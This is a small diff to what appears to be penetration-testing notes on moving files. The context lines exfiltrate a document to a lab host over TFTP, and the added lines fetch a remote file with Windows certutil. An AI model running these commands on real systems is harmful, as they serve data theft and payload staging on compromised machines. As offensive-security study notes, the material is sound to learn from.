@@ -120,3 +120,7 @@ sudo atftpd --daemon --port 69 /tftp
 windows xp, 2003 etc:
 tftp -i 10.11.0.4 put important.docx
 ```
+### Certutil(windows has this built-in)
+```
+certutil.exe -urlcache -split -f http://example.com/a.txt
+```
